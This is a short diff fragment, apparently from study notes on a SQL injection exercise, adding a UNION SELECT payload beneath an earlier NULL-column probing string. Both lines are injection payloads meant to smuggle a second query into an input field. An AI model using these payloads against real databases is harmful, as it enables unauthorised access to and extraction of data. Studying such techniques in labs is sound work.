@@ -57,4 +57,5 @@ Analysis:
 ' UNION select NULL, 'a', NULL--
 
 
-
+Marco: 
+Payload: "'+UNION+SELECT+21,'nPZPPZ',1200 order by 1--"
